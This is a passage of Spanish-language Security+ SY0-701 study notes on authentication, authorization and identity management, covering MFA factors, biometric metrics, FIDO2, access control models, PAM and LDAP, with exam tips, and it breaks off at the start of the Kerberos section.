### 4.1.1 Diseño de Autenticación
 
**Tres pilares del diseño de autenticación (triada CIA aplicada):**
 
| Pilar | Aplicación en Autenticación |
|---|---|
| **Confidencialidad** | Si se filtran credenciales, un atacante puede suplantar al titular |
| **Integridad** | El mecanismo debe ser fiable; difícil de eludir con credenciales falsificadas |
| **Disponibilidad** | El proceso no debe obstaculizar el flujo de trabajo del usuario |
 
#### Los factores de autenticación
 
Los factores son las **categorías** de credenciales que puede presentar un usuario:
 
- **Factor de conocimiento** — "Algo que la persona **sabe**"
  - Contraseña, frase de contraseña (passphrase), PIN (Número de Identificación Personal)
  - **Analogía:** La llave de tu casa que solo tú conoces.
  - ⚠️ El **PIN** moderno se diferencia de la contraseña en que es **válido únicamente para un dispositivo específico**. Puede tener cualquier longitud y tipo de carácter.
- **Factor de propiedad** — "Algo que la persona **tiene**"
  - Tarjeta inteligente, key fob (llavero criptográfico), smartphone
- **Factor biométrico/inherencia** — "Algo que la persona **es**"
  - Huella digital, reconocimiento facial, patrón de marcha (gait analysis)
- **Factor de ubicación** — "Algún **lugar** donde está la persona"
  - Dirección IP, geolocalización, segmento de red, VLAN (Red de Área Local Virtual), puerto físico

> **👉 Enfoque de Examen SY0-701:**
> CompTIA suele preguntar: "¿Cuántos factores usa este escenario?" Recuerda que **dos factores de conocimiento** (ej. PIN + fecha de nacimiento) NO es MFA (Autenticación de Multifactores). MFA requiere factores de **categorías diferentes**. El factor de ubicación se usa como autenticación **continua o control de acceso**, no como factor principal.

### 4.1.2 Conceptos sobre Contraseñas
 
#### Componentes de una política de contraseñas sólida
 
| Componente | Descripción |
|---|---|
| **Longitud mínima** | Impone un número mínimo de caracteres |
| **Longitud máxima** | Límite superior (menos común) |
| **Complejidad** | Combinación de mayúsculas, minúsculas, números y caracteres especiales; no usar el nombre de usuario |
| **Antigüedad (Age)** | Obliga a cambiar la contraseña tras N días |
| **Caducidad (Expiry)** | La cuenta queda **desactivada** si no se renueva a tiempo |
| **Historial/Reutilización** | Bloquea el uso de contraseñas ya utilizadas anteriormente |
| **Antigüedad mínima** | Impide cambiar la contraseña demasiado rápido para volver a la contraseña preferida |
 
#### Distinción clave: Antigüedad vs. Caducidad
 
| Término | Significado |
|---|---|
| **Antigüedad (Age)** | El usuario **aún puede iniciar sesión** pero debe elegir una nueva contraseña de inmediato |
| **Caducidad (Expiry)** | El usuario **ya NO puede iniciar sesión**; la cuenta queda efectivamente desactivada |
 
#### 🔔 Nota NIST (National Institute of Standards and Technology)
 
Las recomendaciones más recientes del **NIST** han **descartado** algunos elementos "tradicionales":
- ❌ Complejidad obligatoria (reglas rígidas de caracteres)
- ❌ Vencimiento periódico forzado
- ❌ Pistas de contraseña (password hints)
> La **reutilización de contraseña** entre el trabajo y sitios de consumo es un riesgo que solo puede controlarse mediante **políticas y formación**, no técnicamente.
 
> **👉 Enfoque de Examen SY0-701:**
> Una pregunta clásica: "Un usuario cambia su contraseña 10 veces seguidas para volver a la original. ¿Qué política previene esto?" → **Antigüedad mínima de contraseña** (minimum password age) combinada con el **historial de contraseñas**.

### 4.1.3 Administradores de Contraseñas
 
**Problema que resuelven:** Los usuarios reutilizan contraseñas entre cuentas corporativas y sitios de consumo → riesgo de violación de datos.
 
#### Flujo de funcionamiento de un administrador de contraseñas
 
1. **Selección** → El usuario elige una aplicación (ej. LastPass, 1Password, Credential Manager de Windows, iCloud Keychain de Apple)
2. **Bóveda** → Se protege con una **contraseña maestra** (único secreto a recordar). La bóveda puede almacenarse en la nube o localmente.
3. **Generación** → Al crear/actualizar una cuenta, el administrador genera una contraseña aleatoria cumpliendo la política del sitio.
4. **Autocompletado seguro** → Al navegar, el administrador valida la identidad del sitio mediante su **certificado digital** antes de completar la contraseña.
#### Riesgos principales de los administradores de contraseñas
 
- Contraseña maestra débil
- Compromiso del almacenamiento en la nube del proveedor
- Ataques de **suplantación de identidad (phishing)** que engañen al gestor para que complete credenciales en un sitio falso
> **👉 Enfoque de Examen SY0-701:**
> CompTIA puede preguntar qué mecanismo usa el administrador de contraseñas para verificar un sitio antes de rellenar credenciales → **certificados digitales**.

### 4.1.4 Autenticación de Multifactores (MFA)
 
> **MFA (Multi-Factor Authentication)** = Combinar **más de un tipo** de factor de autenticación de categorías diferentes.
 
#### Regla de oro de MFA
 
```
PIN + Contraseña          ❌  NO es MFA  (ambos son factores de conocimiento)
Contraseña + Huella       ✅  SÍ es MFA  (conocimiento + biométrico)
Tarjeta inteligente + PIN ✅  SÍ es MFA  (propiedad + conocimiento)
```
 
#### 2FA (Two-Factor Authentication) vs. MFA
 
| Término | Significado |
|---|---|
| **2FA** | Exactamente **dos** factores de categorías diferentes |
| **MFA** | **Dos o más** factores de categorías diferentes |
 
#### Factor de ubicación — Casos de uso
 
- Un usuario inicia sesión desde Nueva York y dos horas después desde Los Ángeles → **tiempo de viaje imposible** → se rechaza y genera alerta
- La dirección IP del dispositivo no coincide con el país esperado → se restringen privilegios o se deniega acceso
- Se puede usar VLAN (Virtual LAN), segmento de red lógico o señal Wi-Fi como base del factor de ubicación
> **👉 Enfoque de Examen SY0-701:**
> La pregunta favorita de CompTIA: "¿Es esto MFA?" → Busca si los factores son de **categorías distintas**. Otra variante: preguntan sobre "verificación de dos pasos" (two-step verification), que puede usar dos factores del mismo tipo y **no equivale a MFA**.

### 4.1.5 Autenticación Biométrica
 
#### Proceso de configuración biométrica
 
1. **Registro (Enrollment):** El módulo sensor adquiere la muestra biométrica del usuario.
2. **Extracción de características:** Se crea una **plantilla** (representación matemática única).
3. **Autenticación:** Se vuelve a escanear y se compara con la plantilla dentro de un grado de tolerancia.
#### Métricas de rendimiento biométrico
 
| Métrica | Sigla (inglés) | Descripción | Tipo de error |
|---|---|---|---|
| **Tasa de Falso Rechazo** | FRR / FNMR | Usuario legítimo no es reconocido | Error Tipo I |
| **Tasa de Falsa Aceptación** | FAR / FMR | Un intruso es aceptado | Error Tipo II |
| **Tasa de Error de Cruce** | CER | Punto donde FRR = FAR | — |
| **Tasa de Falla de Registro** | FER | No se puede crear plantilla durante el registro | — |
 
#### Regla de oro de las métricas
 
```
FRR alta → Inconveniente para usuarios legítimos
FAR alta → Brecha de seguridad (más crítica)
CER baja → Tecnología más eficiente y confiable
```
 
#### Tipos de biometría
 
| Tipo | Método | Notas |
|---|---|---|
| **Huella digital** | Sensor capacitivo u óptico | Más extendido, económico, fácil de usar. Humedad/suciedad puede interferir. |
| **Reconocimiento facial** | Cámaras ópticas e infrarrojas | Los sensores IR frustran ataques de suplantación con fotos |
| **Identificadores de comportamiento** | Patrón de marcha (gait) | Más difícil de falsificar |
 
#### Consideraciones adicionales
 
- **Velocidad/Rendimiento:** Crítica en entornos de alto volumen (aeropuertos, estaciones)
- **Costo/Implementación:** Los escáneres de iris son más caros que los de huella digital
- **Privacidad:** Los usuarios pueden considerarlo intrusivo
- **Accesibilidad:** Puede ser discriminatorio o inaccesible para personas con discapacidad
> **👉 Enfoque de Examen SY0-701:**
> CompTIA pregunta: "¿Qué métrica indica cuándo la tasa de falso rechazo iguala a la de falsa aceptación?" → **CER (Crossover Error Rate)**. También: "¿Qué error es más grave en seguridad?" → **FAR (Error Tipo II)** porque admite intrusos.

### 4.1.6 Tokens de Autenticación Físicos
 
> **Analogía:** Como un llavero de coche que genera una señal única cada vez para abrir el vehículo, pero sin transmitir el código secreto.
 
#### Tres tipos de generación de tokens
 
| Tipo | Descripción | Ventajas/Inconvenientes |
|---|---|---|
| **Basado en certificados** | El solicitante controla una clave privada → genera token firmado único. La parte de confianza verifica con la clave pública. | Requiere **PKI** (Infraestructura de Clave Pública) completa → carga administrativa alta |
| **OTP (One-Time Password / Contraseña de Un Solo Uso)** | Token generado por función hash sobre secreto compartido + semilla de sincronización (timestamp o contador). Solo se usa una vez. | No requiere PKI. Tipos: **TOTP** (Time-based) y **HOTP** (HMAC-based) |
| **FIDO (Fast Identity Online) U2F (Universal 2nd Factor)** | Par de claves pública/privada por cuenta. La privada queda bloqueada en el dispositivo. No se transmite secreto compartido. | Evita la debilidad de secreto compartido de HOTP/TOTP. La PKI interviene solo para **certificados de attestation**. |
 
#### TOTP vs. HOTP
 
| | TOTP | HOTP |
|---|---|---|
| **Sincronización** | Marca de tiempo (tiempo) | Contador (HMAC-based) |
| **Validez** | Período corto de tiempo | Hasta que se use |
| **Riesgo** | Desincronización de reloj | Desincronización de contador |
 
#### Tipos de autenticadores físicos
 
| Dispositivo | Tecnología | Notas |
|---|---|---|
| **Tarjeta inteligente** | Certificados digitales + PIN | Tipos: contacto físico y NFC (Near Field Communication / Comunicación de Campo Cercano). Almacena certificado, clave privada y PIN. |
| **Key fob / Token OTP** | Criptoprocesador genera código | No necesita interfaz con PC; el usuario lee el código en pantalla |
| **Clave de seguridad** | HSM (Hardware Security Module / Módulo de Seguridad de Hardware) portátil; USB o NFC | Más asociado con U2F. Requiere activación de presencia: botón físico o lector biométrico de huella + PIN de respaldo |
 
#### ⚠️ Tokens estáticos — Riesgo crítico
 
Las tarjetas y fobs más simples transmiten un **código estático** (sin cambio). Son extremadamente vulnerables a **ataques de clonación y reproducción (replay attacks)**.
 
> **👉 Enfoque de Examen SY0-701:**
> CompTIA distingue TOTP vs. HOTP por su mecanismo de sincronización. También pregunta qué tipo de token elimina la necesidad de transmitir un secreto compartido → **FIDO U2F**. La "attestation" (ratificación) es clave en FIDO: demuestra que el dispositivo es genuino.

### 4.1.7 Tokens de Autenticación Blandos
 
> **Definición:** Un token blando es una OTP generada por el **proveedor de identidad** y transmitida al solicitante (en lugar de generarse localmente).
 
#### Métodos de entrega de tokens blandos
 
| Método | Factor real | Seguridad | Notas |
|---|---|---|---|
| **SMS/Mensaje de texto** | ❌ No es factor de propiedad real | Baja | Vulnerable a interceptación; se considera **verificación de dos pasos**, no MFA |
| **Correo electrónico** | ❌ No es factor de propiedad real | Baja | Mismo problema que SMS |
| **Aplicación autenticadora** (soft token app) | ✅ Factor de propiedad (dispositivo) | Media-Alta | Más seguro que SMS. Riesgo: malware en el dispositivo compartido |
 
#### Flujo de la aplicación autenticadora
 
1. Usuario registra cada proveedor de identidad en la app (ej. Google Authenticator, Microsoft Authenticator).
2. Se escanea un **código QR (Quick Response)** para comunicar el secreto compartido.
3. Al autenticarse, el usuario desbloquea la app con sus credenciales del dispositivo.
4. La app muestra el token OTP vigente.
> **👉 Enfoque de Examen SY0-701:**
> Pregunta trampa: "¿Un código enviado por SMS es un factor de propiedad?" → **NO**. Los tokens blandos por SMS/email son "verificación de dos pasos" (two-step verification), no MFA verdadera. La app autenticadora sí se acerca más a un factor de propiedad real.

### 4.1.8 Autenticación Sin Contraseña
 
> **Concepto:** El sistema de autenticación **elimina por completo** los factores de conocimiento (contraseñas).
 
#### FIDO2 y WebAuthn — El estándar
 
**FIDO2** con **WebAuthn (Web Authentication API)** proporciona el marco para la autenticación sin contraseña.
 
#### Flujo de autenticación sin contraseña (FIDO2/WebAuthn)
 
```
1. Usuario elige autenticador:
   - Autenticador de ROAMING → Clave de seguridad física (USB/NFC)
   - Autenticador de PLATAFORMA → Windows Hello / Face ID / Touch ID
 
2. Usuario configura gesto local:
   - Huella digital, reconocimiento facial, o PIN local
   - Esta credencial se valida SOLO LOCALMENTE en el dispositivo
 
3. Registro con la Parte de Confianza (Relying Party / RP):
   - El autenticador genera un par de claves pública/privada ÚNICO por RP
   - La clave PÚBLICA se registra en el servidor de la RP
   - La clave PRIVADA NUNCA sale del dispositivo
 
4. Autenticación:
   - Se presenta desafío → usuario realiza el gesto local
   - La clave privada firma la confirmación
   - La RP verifica con la clave pública → sesión autenticada
 
5. La RP NO conoce la contraseña → no puede filtrarse
```
 
#### FIDO U2F vs. FIDO2/WebAuthn
 
| | FIDO U2F | FIDO2 / WebAuthn |
|---|---|---|
| **Uso** | Segundo factor | Factor único (sin contraseña) |
| **API web** | No | ✅ Sí (WebAuthn API) |
| **Compatibilidad** | Los dispositivos U2F son compatibles con FIDO2 | Superconjunto de U2F |
 
#### Attestation (Ratificación)
 
- **Qué es:** Mecanismo por el cual el dispositivo autenticador prueba que es genuino (raíz de confianza).
- **Cómo funciona:** Cada dispositivo lleva un **certificado de attestation** y un **ID de modelo** (no único por dispositivo para proteger la privacidad).
- **Por qué no es único por dispositivo:** Para evitar que se identifique y rastree individualmente a las personas.
- La RP verifica que el autenticador es de una marca/modelo conocido con las propiedades criptográficas requeridas.
> **👉 Enfoque de Examen SY0-701:**
> FIDO2/WebAuthn elimina la contraseña completamente. La "parte de confianza" (relying party) es el servicio web. La attestation verifica el **modelo** del autenticador, no al usuario individual. Comparado con FIDO U2F: la mejora clave es la **API WebAuthn** que permite eliminar el campo de contraseña en aplicaciones web.

## 4.2 Autorización
 
> **Concepto clave:** La autorización determina **qué puede hacer** un usuario ya autenticado. Define los derechos y permisos sobre recursos.

### 4.2.1 Control de Acceso Discrecional y Obligatorio
 
#### DAC — Discretionary Access Control (Control de Acceso Discrecional)
 
> **Analogía:** Eres propietario de una casa (recurso) y decides tú mismo quién tiene llave (acceso).
 
- **Principio:** El **propietario del recurso** tiene control total y puede modificar la **ACL (Access Control List / Lista de Control de Acceso)**.
- **Implementación:** Sistema predeterminado en UNIX/Linux y Windows.
- **Ventaja:** Modelo más **flexible**.
- **Desventaja:** El más **débil** en seguridad:
  - Dificulta la administración centralizada de políticas.
  - Vulnerable a amenazas internas y abuso de cuentas comprometidas.
#### MAC — Mandatory Access Control (Control de Acceso Obligatorio)
 
> **Analogía:** Un edificio gubernamental donde las salas tienen niveles de clasificación (Confidencial, Secreto, Ultrasecreto) y tus credenciales de seguridad determinan a cuáles puedes entrar, sin importar quién seas.
 
- **Principio:** Basado en **niveles de habilitación de seguridad**. Las reglas las establece el sistema, no los usuarios.
- **Cómo funciona:**
  - A cada **objeto** → se le asigna una **etiqueta de clasificación**.
  - A cada **sujeto** → se le otorga un **nivel de autorización**.
- **Regla "read down, write up":**
```
Nivel Ultrasecreto puede LEER: Ultrasecreto, Secreto, Confidencial ✅
Nivel Secreto puede LEER: Secreto, Confidencial ✅
Nivel Secreto NO PUEDE LEER: Ultrasecreto ❌
 
Un usuario con autorización Alta NO PUEDE ESCRIBIR documentos de nivel bajo
→ Previene la filtración de datos a niveles menos seguros
```
 
- **Compartimentos:** Para mayor flexibilidad, se añade acceso por compartimentos (ej. clasificación Secreto + compartimento RRHH).
#### DAC vs. MAC — Tabla Comparativa
 
| Característica | DAC | MAC |
|---|---|---|
| **Control** | Propietario del recurso | Sistema (reglas preestablecidas) |
| **Flexibilidad** | Alta | Baja |
| **Seguridad** | Débil | Fuerte |
| **Implementación típica** | Windows NTFS, Linux permisos | Sistemas militares/gubernamentales |
| **Discrecional** | ✅ Sí | ❌ No |
| **ACL modificable por usuario** | ✅ Sí (si es propietario) | ❌ No |
 
> **👉 Enfoque de Examen SY0-701:**
> "Write up, read down" es una regla exclusiva de **MAC**. Si un escenario menciona "etiquetas de clasificación" o "niveles de autorización", es MAC. Si menciona que el propietario asigna permisos libremente, es DAC. CompTIA puede preguntar cuál modelo es más vulnerable a amenazas internas → **DAC**.

### 4.2.2 Control de Acceso Basado en Funciones y Atributos
 
#### RBAC — Role-Based Access Control (Control de Acceso Basado en Funciones)
 
> **Analogía:** En una empresa, al nuevo empleado de Contabilidad se le asigna el "rol de Contable" que ya tiene todos los permisos necesarios, sin configurar cada permiso individualmente.
 
- **Principio:** Los permisos se asignan a **roles/funciones** (no directamente a usuarios). Los usuarios heredan permisos al pertenecer a un rol.
- **Características:**
  - No discrecional: el usuario **no puede** modificar la ACL del recurso.
  - Los derechos se adquieren de forma **implícita** (por rol) no explícita (por asignación directa).
  - Las ACL del sistema de archivos almacenan y aplican los permisos.
  - Funciona en Windows y UNIX/Linux.
#### Grupos de seguridad como implementación de RBAC
 
```
Sin RBAC: Usuario → permisos asignados directamente (no escalable)
Con RBAC: Usuario → Grupo de Seguridad → ACL del objeto → Hereda permisos
```
 
**Ventaja:** Una cuenta puede pertenecer a múltiples grupos, heredando permisos de varias fuentes.
 
**Riesgo:** Si los administradores asignan roles a sus propias cuentas arbitrariamente → **escalada de privilegios**.
 
#### ABAC — Attribute-Based Access Control (Control de Acceso Basado en Atributos)
 
> **Analogía:** Un sistema VIP inteligente que verifica no solo tu membresía (rol), sino también si llevas traje (atributo), si es horario VIP (contexto) y si estás en la ciudad correcta (ubicación).
 
- **Principio:** El modelo **más granular**. Las decisiones de acceso se basan en una combinación de:
  - Atributos del **sujeto** (usuario, rol, departamento)
  - Atributos del **objeto** (tipo de dato, clasificación)
  - Atributos de **contexto/sistema** (sistema operativo, IP, parches actualizados, antimalware)
- **Capacidades adicionales de ABAC:**
  - Monitorea cantidad de eventos/alertas asociados con una cuenta.
  - Rastrea solicitudes de acceso para verificar coherencia geográfica/temporal.
  - Puede implementar **separación de funciones** y **control M de N**.
#### Control M de N
 
- **Definición:** Requiere que un número mínimo **M** de agentes, de un total de **N**, colaboren para realizar una tarea de seguridad de alto nivel (ej. firma de claves criptográficas).
- **Ejemplo:** Para firmar una clave PKI se necesitan 3 de 5 administradores.
#### RBAC vs. ABAC — Comparativa
 
| Característica | RBAC | ABAC |
|---|---|---|
| **Granularidad** | Media | Alta (la más detallada) |
| **Basado en** | Roles/Funciones | Múltiples atributos + contexto |
| **Flexibilidad** | Media | Alta |
| **Complejidad** | Media | Alta |
| **Casos de uso** | Empresas con roles bien definidos | Entornos que requieren control fino contextual |
 
> **👉 Enfoque de Examen SY0-701:**
> Pregunta típica: "¿Qué modelo de control de acceso es el más granular?" → **ABAC**. "¿Cuál asigna permisos basados en la función laboral?" → **RBAC**. No confundas RBAC con DAC: en RBAC el usuario **no puede** modificar las ACL del recurso; en DAC el propietario sí puede.

### 4.2.3 Control de Acceso Basado en Reglas
 
- **Definición:** Cualquier modelo donde las **políticas de acceso las determina el sistema** (no los usuarios).
- **Incluye:** MAC, RBAC y ABAC son todos ejemplos de control de acceso basado en reglas (no discrecional).
#### Acceso Condicional
 
- **Qué hace:** Supervisa el comportamiento de la cuenta/dispositivo durante una sesión.
- **Si se cumplen condiciones específicas:** puede suspender la cuenta o exigir re-autenticación.
- **Ejemplos concretos:**
  - **UAC (User Account Control / Control de Cuentas de Usuario)** de Windows
  - **`sudo`** en Linux
  - Políticas basadas en ubicación geográfica
> **👉 Enfoque de Examen SY0-701:**
> "¿Cuál es un ejemplo de acceso condicional?" → UAC de Windows y sudo de Linux. El acceso condicional puede "pausar" una sesión activa si se detecta comportamiento anómalo, lo que lo diferencia de los modelos que solo verifican en el inicio de sesión.

### 4.2.4 Asignaciones de Permisos de Mínimo Privilegio
 
> **Principio:** A cada entidad se le otorgan los derechos **mínimos posibles** para completar las tareas autorizadas.
 
#### ¿Por qué es importante?
 
- Mitiga el riesgo si una cuenta es comprometida.
- Limita el daño potencial de malware o actores malintencionados.
#### Desafíos de implementación
 
| Desafío | Consecuencia |
|---|---|
| Privilegios demasiado restrictivos | Alto volumen de llamadas de soporte, reducción de productividad |
| Privilegios excesivos | Debilitamiento de la seguridad, mayor riesgo de malware y filtraciones |
 
#### Acumulación de autorizaciones (Privilege Creep)
 
- **Definición:** Un usuario adquiere **cada vez más derechos** con el tiempo (directamente o por pertenencia a grupos).
- **Prevención:**
  - Auditorías regulares de privilegios.
  - Revisión periódica de membresía de grupos.
  - Revisión de ACL de cada recurso.
  - Identificación y desactivación de cuentas innecesarias.
  - Sistema para revocar privilegios temporales al finalizar el período acordado.
> **👉 Enfoque de Examen SY0-701:**
> "Un usuario cambió de departamento tres veces y ahora tiene acceso a recursos de todos sus departamentos anteriores. ¿Qué concepto describe esto?" → **Privilege creep / Acumulación de autorizaciones**. La solución es la auditoría periódica de permisos.

### 4.2.5 Aprovisionamiento de Cuentas de Usuario
 
> **Aprovisionamiento:** Proceso de configurar un servicio/cuenta conforme a procedimientos estándar y buenas prácticas.
 
#### Pasos del aprovisionamiento de una cuenta de usuario
 
1. **Verificación de identidad** → Confirmar quién es la persona (documentos, registros, comprobación de antecedentes)
2. **Emisión de credenciales** → El usuario elige contraseña o se registra con autenticadores biométricos/tokens
3. **Emisión de activos (hardware/software)** → PC, smartphone, aplicaciones con licencia
   - ⚠️ Recursos insuficientes → el usuario busca alternativas por su cuenta → **Shadow IT (TI en la sombra)**
4. **Concientización sobre políticas** → Capacitación en seguridad, políticas de uso aceptable
5. **Creación de asignación de permisos** → Configurar derechos según modelo de control de acceso (RBAC/MAC/ABAC). Si tiene acceso privilegiado → etiquetado para monitoreo estrecho.
#### Desaprovisionamiento
 
- **Definición:** Eliminar derechos y permisos cuando alguien deja la empresa o finaliza un proyecto.
- **Proceso:** Eliminar de roles/grupos → Desactivar cuenta → Eliminar (inmediatamente o después de un período).
> **👉 Enfoque de Examen SY0-701:**
> "Un empleado deja la empresa. ¿Cuál es el primer paso crítico de seguridad?" → **Desaprovisionamiento inmediato** de la cuenta (desactivar acceso). El término **Shadow IT** aparece cuando los usuarios obtienen recursos por su cuenta por falta de aprovisionamiento adecuado.

### 4.2.6 Atributos de Cuenta y Políticas de Acceso
 
#### Componentes de una cuenta de usuario
 
- **SID (Security Identifier / Identificador de Seguridad):** Identificador único de la cuenta en el sistema.
- **Nombre de cuenta:** Identificador visible.
- **Credencial:** Contraseña, biométrico, token.
- **Perfil:** Contiene atributos personalizados (nombre completo, email, departamento, número de contacto, imagen de cuenta).
- **Carpeta de inicio (Home folder):** Ubicación de almacenamiento de archivos del usuario.
- **Configuración por cuenta:** Preferencias de aplicaciones de software.
#### Permisos y políticas de acceso
 
Los permisos pueden asignarse:
- **Directamente** a la cuenta, o
- **Heredarse** a través de la pertenencia a grupos/roles de seguridad.
Las políticas de acceso determinan derechos como:
- Iniciar sesión localmente o mediante escritorio remoto
- Instalar software
- Cambiar configuración de red
#### GPO — Group Policy Objects (Objetos de Directiva de Grupo) en Windows
 
- Herramienta de **Active Directory (AD)** para definir y aplicar políticas de acceso.
- Se vinculan a límites administrativos:
  - **Sitios**
  - **Dominios**
  - **OU (Organizational Units / Unidades Organizacionales)**
> **👉 Enfoque de Examen SY0-701:**
> CompTIA puede preguntar cómo se aplican políticas de acceso en entornos Windows → **GPO vinculados a AD**. Los GPO pueden configurar derechos para usuarios, grupos y roles dentro de sitios, dominios y UO.

### 4.2.7 Restricciones de la Cuenta
 
#### Políticas basadas en la ubicación
 
| Mecanismo | Descripción |
|---|---|
| **Ubicación de red lógica** | IP, subred, VLAN, OU → restringe inicio de sesión local en servidores de zonas restringidas |
| **Geolocalización por IP** | Se consultan bases de datos (ej. GeoIP) para mapear IPs a países/regiones. Precisión limitada por el ISP (Internet Service Provider / Proveedor de Servicios de Internet). |
| **GPS (Global Positioning System / Sistema de Posicionamiento Global)** | Alta precisión en exteriores |
| **Servicios de ubicación** | Triangulación de torres celulares, puntos de acceso Wi-Fi y señales Bluetooth |
 
#### Políticas basadas en el tiempo
 
| Política | Descripción |
|---|---|
| **Restricciones horarias (time-of-day)** | Define las horas autorizadas de inicio de sesión para una cuenta |
| **Inicio de sesión por duración** | Establece el tiempo máximo que una cuenta puede estar conectada |
| **Tiempo de viaje imposible / inicio de sesión riesgoso** | Detecta inicios de sesión desde ubicaciones geográficamente imposibles en el tiempo transcurrido → desactiva cuenta y genera alerta |
| **Permisos temporales** | Elimina automáticamente una cuenta de un rol/grupo después de un período definido |
 
> **👉 Enfoque de Examen SY0-701:**
> "Un usuario inicia sesión en Nueva York y dos horas después se detecta un intento desde Los Ángeles. ¿Qué política actúa aquí?" → **Tiempo de viaje imposible / inicio de sesión riesgoso (impossible travel / risky sign-in)**. Esta política es clave en Zero Trust.

### 4.2.8 Administración de Acceso con Privilegios (PAM)
 
#### Tipos de cuentas por nivel de privilegio
 
| Tipo | Descripción |
|---|---|
| **Usuario estándar** | Solo puede ejecutar programas y modificar archivos de su propio perfil |
| **Cuenta privilegiada** | Puede instalar software, desactivar cortafuegos, administrar redes, servidores y bases de datos |
 
#### PAM — Privileged Access Management (Administración de Acceso Privilegiado)
 
- **Qué incluye:** Políticas, procedimientos y controles técnicos para prevenir el compromiso de cuentas privilegiadas.
- **Funciones:** Identificar y documentar cuentas privilegiadas, dar visibilidad de su uso, gestionar sus credenciales.
#### Buenas prácticas de PAM
 
- Minimizar el número de cuentas administrativas.
- No compartir cuentas administrativas entre varios administradores.
- No usar cuentas predeterminadas (compromete la responsabilidad/trazabilidad).
- Usar contraseñas fuertes + MFA o autenticación sin contraseña.
- Usar **SAW (Secure Administrative Workstation / Estación de Trabajo Administrativa Segura):** dispositivo dedicado con superficie de ataque mínima y solo las aplicaciones estrictamente necesarias.
#### JIT — Just-in-Time Permissions (Permisos Justo a Tiempo)
 
> Los privilegios NO se asignan al iniciar sesión. Se solicitan explícitamente y se otorgan solo por un período limitado.
 
**Concepto relacionado: ZSP — Zero Standing Privileges (Privilegios Permanentes Cero)**
 
#### Tres modelos de implementación de JIT/ZSP
 
| Modelo | Descripción | Nivel de control |
|---|---|---|
| **Elevación temporal** | La cuenta obtiene derechos administrativos por un período limitado (ej. UAC en Windows, `sudo` en Linux) | Básico |
| **Bóveda de contraseñas / Intermediación (Vaulting/Brokering)** | La cuenta privilegiada se "saca" de un repositorio; disponible por tiempo limitado; requiere justificación. La aprobación puede automatizarse o requerir aprobación manual (control M de N) | Avanzado |
| **Credenciales efímeras** | El sistema genera/habilita una cuenta para la tarea y la destruye/deshabilita al finalizar | Máximo |
 
> **👉 Enfoque de Examen SY0-701:**
> "¿Qué término describe el modelo donde los privilegios administrativos solo se otorgan cuando se solicitan y por tiempo limitado?" → **JIT (Just-in-Time)** o **ZSP (Zero Standing Privileges)**. La "bóveda de contraseñas" es más segura que la elevación temporal porque requiere justificación y proporciona trazabilidad. La PAM también se aplica a **cuentas de servicio**, no solo a administradores humanos.

## 4.3 Administración de Identidades
 
> **Contexto:** A medida que las organizaciones migran servicios a la nube, la administración de cuentas y derechos requiere soluciones de **identidad federada** que vayan más allá de los directorios locales.

### 4.3.1 Autenticación Local, de Red y Remota
 
#### Principio base: almacenamiento de credenciales
 
Las contraseñas **nunca se almacenan en texto plano**. Se almacenan como **hashes criptográficos**. Al autenticarse, la contraseña ingresada se hashea y se compara con el hash almacenado.
 
#### Autenticación en Windows
 
| Escenario | Mecanismo |
|---|---|
| **Inicio de sesión local** | **LSASS** (Local Security Authority Subsystem Service / Servicio del Subsistema de la Autoridad de Seguridad Local) compara el hash con la base de datos **SAM** (Security Accounts Manager / Administrador de Cuentas de Seguridad), parte del registro. También llamado "inicio de sesión interactivo". |
| **Inicio de sesión en red** | LSASS pasa credenciales a un **controlador de dominio de Active Directory (AD)**. Protocolo preferido: **Kerberos**. Aplicaciones heredadas pueden usar **NTLM** (NT LAN Manager). |
| **Inicio de sesión remoto** | A través de **VPN (Virtual Private Network / Red Privada Virtual)**, Wi-Fi empresarial o portal web. Usan protocolos para crear una conexión segura entre cliente, dispositivo de acceso remoto y servidor de autenticación. |
 
#### Autenticación en Linux
 
| Elemento | Descripción |
|---|---|
| `/etc/passwd` | Almacena nombres de cuentas locales |
| `/etc/shadow` | Almacena los hashes de contraseñas |
| **SSH (Secure Shell / Shell Seguro)** | Protocolo para inicio de sesión interactivo remoto. Permite autenticación con **claves criptográficas** en lugar de contraseñas. |
| **PAM (Pluggable Authentication Module / Módulo de Autenticación Conectable)** | Paquete que habilita distintos proveedores de autenticación (ej. tarjeta inteligente). También puede implementar autenticación en servicios de directorio de red. |
 
> **👉 Enfoque de Examen SY0-701:**
> CompTIA puede preguntar: "¿Qué módulo de Linux permite integrar distintos métodos de autenticación?" → **PAM**. "¿Dónde se almacenan los hashes de contraseñas en Linux?" → `/etc/shadow`. "¿Qué protocolo usa Windows para autenticación de red moderna vs. heredada?" → **Kerberos** (moderno) vs. **NTLM** (heredado).

### 4.3.2 Servicios de Directorio
 
> **Analogía:** Un directorio de empresa es como una guía telefónica digital que almacena información sobre todos los empleados, sus departamentos, sus permisos y los recursos disponibles.
 
#### LDAP — Lightweight Directory Access Protocol (Protocolo Ligero de Acceso a Directorios)
 
- **Base:** Desarrollado a partir del estándar **X.500**.
- **Propósito:** Asegurar la interoperabilidad entre productos de distintos proveedores.
- Los servicios de directorio almacenan: usuarios, equipos, grupos de seguridad/roles, servicios.
- Cada objeto tiene **atributos** definidos por el **esquema** del directorio.
#### Estructura de nombres en LDAP (basada en X.500)
 
| Atributo | Significado |
|---|---|
| `CN` | Common Name (Nombre Común) |
| `OU` | Organizational Unit (Unidad Organizacional) |
| `O` | Organization (Organización) |
| `C` | Country (País) |
| `DC` | Domain Component (Componente de Dominio) |
 
**Ejemplo de Distinguished Name (DN / Nombre Distinguido):**
```
CN=WIDGETWEB, OU=Marketing, O=Widget, C=UK, DC=widget, DC=foo
```
- El atributo **más específico** va primero → identifica de forma única el objeto.
- El **Relative Distinguished Name (RDN)** es el atributo más específico dentro de su contexto.
> **👉 Enfoque de Examen SY0-701:**
> CompTIA puede preguntar qué protocolo usa Active Directory para consultas de directorio → **LDAP**. Los atributos DN más frecuentes en preguntas son CN, OU y DC. El estándar base de LDAP es **X.500**.

### 4.3.3 Autenticación de Inicio de Sesión Único (SSO) — Kerberos
 
> **SSO (Single Sign-On / Inicio de Sesión Único):** El usuario se autentica **una sola vez** y recibe acceso a múltiples servicios sin volver a ingresar credenciales.
 
#### Kerberos — El guardián de tres cabezas
 
- **Nombre:** Inspirado en el perro de tres cabezas de la mitología griega (Cerbero).
- **Las tres partes:** Cliente, Servidor de Aplicaciones, y **KDC (Key Distribution Center / Centro de Distribución de Claves)**.
- **Implementación principal:** Active Directory de Microsoft.
- **Usuarios de Kerberos:** "Principales" = usuarios humanos + servicios de aplicaciones.
#### Los dos servicios del KDC
 
